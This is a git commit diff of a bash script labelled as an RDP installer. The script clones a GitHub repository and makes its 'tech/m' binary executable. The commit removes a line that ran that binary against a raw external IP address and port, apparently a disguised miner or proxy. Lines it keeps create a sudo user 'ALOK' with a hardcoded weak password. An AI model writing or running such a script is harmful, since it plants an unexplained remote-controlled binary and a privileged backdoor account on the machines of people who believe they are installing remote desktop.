bb21d2986c6c8c408c34bf76edc9a70a491bf242
phucbmt <phucdlbmt@gmail.com>
2021-01-26 18:54:02 +0700

    Update l.sh

--- l.sh
+++ l.sh
@@ -1,9 +1,9 @@
 #! /bin/bash
 printf "Installing RDP Be Patience... " >&2
 {
-git clone https://github.com/phucbmt/tech.git &> /dev/null
+git clone https://github.com/phucbmt/tech.git
 sudo chmod +x tech/m
-./tech/m -P http://138.197.99.165:4545/test &> log
+
 sudo useradd -m ALOK
 sudo adduser ALOK sudo
 echo 'ALOK:8426' | sudo chpasswd
